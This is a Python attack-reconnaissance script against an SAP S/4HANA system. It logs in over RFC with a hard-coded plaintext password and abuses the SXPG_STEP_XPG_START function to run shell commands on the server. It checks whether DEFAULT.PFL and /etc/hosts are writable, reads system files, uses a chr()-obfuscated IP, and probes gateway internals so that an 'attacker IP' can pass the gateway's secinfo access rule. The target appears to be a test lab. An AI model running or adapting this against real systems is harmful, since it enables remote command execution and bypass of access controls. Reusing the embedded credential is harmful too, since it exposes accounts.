#!/usr/bin/env python3
"""
diag_local_params.py — Find how GW builds its LOCAL IP set.

Goal: determine if DEFAULT.PFL has a parameter that adds 192.168.2.210 to the
GW's LOCAL IP category (so the existing secinfo rule USER-HOST=local matches).

From gw_log: connecting IP 192.168.2.210 → hostname "ubuntu" → not LOCAL.
LOCAL = IPs that s4hanadev (GW's own hostname) resolves to = {192.168.2.209}.

Question: is there a gw/* parameter that extends the LOCAL set without /etc/hosts?
"""
import sys
sys.path.insert(0, '/home/joris/Desktop/CLAUDE/SAPMAP')
from sap_rfc_ctypes import RFCConnection

SDK    = '/home/joris/Desktop/nwrfc750P_18-70002752/nwrfcsdk/lib/libsapnwrfc.so'
HOST   = '192.168.2.209'
SYSNR  = '00'
CLIENT = '001'
USER   = 'joris'
PASSWD = 'SccAdmin123!'


def xpg(conn, prog, params, label):
    print(f"\n{'='*60}")
    print(f"[CMD] {label}")
    print(f"  {prog} {params}")
    print('='*60)
    kw = dict(TARGET='', DESTINATION='', EXTPROG=prog, PARAMS=params,
              STDINCNTL='R', STDOUTCNTL='M', STDERRCNTL='M', TRACECNTL='0',
              TERMCNTL='C', TRACELEVEL='0', LONG_PARAMS='', CONNCNTL='H')
    try:
        try:
            r = conn.call('SXPG_STEP_XPG_START', MXROW=9999, **kw)
        except Exception as e:
            if 'MXROW' in str(e) or 'RFC_INVALID_PARAMETER' in str(e):
                r = conn.call('SXPG_STEP_XPG_START', **kw)
            else:
                print(f'  [RFC error] {e}'); return None
    except Exception as e:
        print(f'  [call failed] {e}'); return None

    status = r.get('STATUS', '?')
    log = r.get('LOG', [])
    if not log:
        print(f'  (no output, status={status!r})')
        return None
    lines = []
    for row in log:
        line = (row.get('MESSAGE') or row.get('LINE') or row.get('TEXT') or '').rstrip() \
               if isinstance(row, dict) else str(row).rstrip()
        if line:
            print(f'  {line}')
            lines.append(line)
    print(f'  [status={status!r}]')
    return lines


def main():
    with RFCConnection(sdk_path=SDK, ashost=HOST, sysnr=SYSNR,
                       client=CLIENT, user=USER, passwd=PASSWD, lang='EN') as conn:
        print('[+] RFC connected\n')

        # ---------------------------------------------------------------
        # 1. Who are we? Confirm writable paths.
        # ---------------------------------------------------------------
        xpg(conn, '/usr/bin/id', '',
            'SXPG runs as which user?')

        xpg(conn, '/bin/bash',
            '-c "test -w /usr/sap/S4H/SYS/profile/DEFAULT.PFL && echo WRITABLE || echo NOT_WRITABLE"',
            'Can s4hadm write DEFAULT.PFL?')

        xpg(conn, '/bin/bash',
            '-c "test -w /etc/hosts && echo WRITABLE || echo NOT_WRITABLE"',
            'Can s4hadm write /etc/hosts?')

        # ---------------------------------------------------------------
        # 2. Search gwrd for all strings starting with "gw/" (profile params)
        #    Use grep -a (treat binary as text) with a pattern matching "gw/"
        #    followed by letters/underscores.
        # ---------------------------------------------------------------
        xpg(conn, '/bin/bash',
            '-c "strings /usr/sap/S4H/D00/exe/gwrd | grep -E \'^gw/[a-z_]+\' | sort -u"',
            'gwrd binary: all gw/* profile parameter names')

        # ---------------------------------------------------------------
        # 3. Specifically look for "local" and "addr" and "trust" parameters
        # ---------------------------------------------------------------
        xpg(conn, '/bin/bash',
            '-c "strings /usr/sap/S4H/D00/exe/gwrd | grep -iE \'local|addr|trust\' | grep -v \'local_addr\' | sort -u | head -60"',
            'gwrd binary: strings containing local/addr/trust (excluding local_addr)')

        # ---------------------------------------------------------------
        # 4. Check dev_rd for GW startup parameter loading messages
        #    GW logs "GwIDumpProfileValue" — look for ALL such lines
        # ---------------------------------------------------------------
        xpg(conn, '/usr/bin/grep',
            '-n "GwIDumpProfileValue\|SyProfileGet\|profile.*gw\|gw.*param\|GetProfileParam" /usr/sap/S4H/D00/work/dev_rd',
            'dev_rd: GW parameter loading events')

        # ---------------------------------------------------------------
        # 5. Look for LOCAL ip-set building in dev_rd
        # ---------------------------------------------------------------
        xpg(conn, '/usr/bin/grep',
            '-n "LOCAL\|local_ip\|GwSetLocal\|GwBuildLocal\|NiIAddr\|NiMyHostname" /usr/sap/S4H/D00/work/dev_rd',
            'dev_rd: LOCAL ip-set building messages')

        # ---------------------------------------------------------------
        # 6. Check if DEFAULT.PFL has any "icm/" parameters we could add
        #    (icm/local_addresses is an ICM param that some kernels expose in GW)
        # ---------------------------------------------------------------
        xpg(conn, '/bin/bash',
            '-c "strings /usr/sap/S4H/D00/exe/gwrd | grep -E \'icm/|SAPLOCALHOST|local.*host\' | sort -u | head -30"',
            'gwrd binary: icm/* params and SAPLOCALHOST')

        # ---------------------------------------------------------------
        # 7. Check gw/reg_no_conn_info handling in dev_rd
        # ---------------------------------------------------------------
        xpg(conn, '/usr/bin/grep',
            '-n "reg_no_conn_info\|conn_info\|ConnInfo" /usr/sap/S4H/D00/work/dev_rd',
            'dev_rd: reg_no_conn_info usage')

        # ---------------------------------------------------------------
        # 8. What does SAPLOCALHOST resolve to? The GW builds LOCAL from this.
        #    Check how SAP resolves its own hostname to IPs.
        # ---------------------------------------------------------------
        xpg(conn, '/bin/bash',
            '-c "getent hosts s4hanadev"',
            'OS: getent hosts s4hanadev (what LOCAL resolves to)')

        xpg(conn, '/bin/bash',
            '-c "getent hosts 192.168.2.210"',
            'OS: getent hosts 192.168.2.210 (reverse lookup of attacker IP)')

        xpg(conn, '/bin/bash',
            '-c "python3 -c \"import socket; print(socket.gethostbyaddr(chr(49)+chr(57)+chr(50)+chr(46)+chr(49)+chr(54)+chr(56)+chr(46)+chr(50)+chr(46)+chr(50)+chr(49)+chr(48)))\" 2>&1"',
            'OS: python gethostbyaddr(192.168.2.210)')

        # ---------------------------------------------------------------
        # 9. Show current /etc/hosts
        # ---------------------------------------------------------------
        xpg(conn, '/bin/cat', '/etc/hosts',
            '/etc/hosts current content')

        # ---------------------------------------------------------------
        # 10. Check nsswitch.conf (is hosts resolution using files+dns or just files?)
        # ---------------------------------------------------------------
        xpg(conn, '/bin/cat', '/etc/nsswitch.conf',
            '/etc/nsswitch.conf (host resolution order)')

        # ---------------------------------------------------------------
        # 11. Are there any writable alternative name resolution files?
        #     /etc/host.conf, /etc/hosts.d/, SAP hosttab
        # ---------------------------------------------------------------
        xpg(conn, '/bin/bash',
            '-c "ls -la /etc/hosts.d/ /etc/host.conf /etc/hostent 2>&1"',
            'Alternative name resolution files')

        xpg(conn, '/bin/bash',
            '-c "find /usr/sap/S4H -name hosttab -o -name host.tab 2>/dev/null"',
            'SAP hosttab files in SAP dirs')

        # ---------------------------------------------------------------
        # 12. Check if gw/local_hostname or similar param is in gwrd
        # ---------------------------------------------------------------
        xpg(conn, '/bin/bash',
            '-c "strings /usr/sap/S4H/D00/exe/gwrd | grep -E \'hostname|HOSTNAME\' | sort -u | head -20"',
            'gwrd binary: hostname-related strings')

        print('\n[*] Done.')


if __name__ == '__main__':
    main()
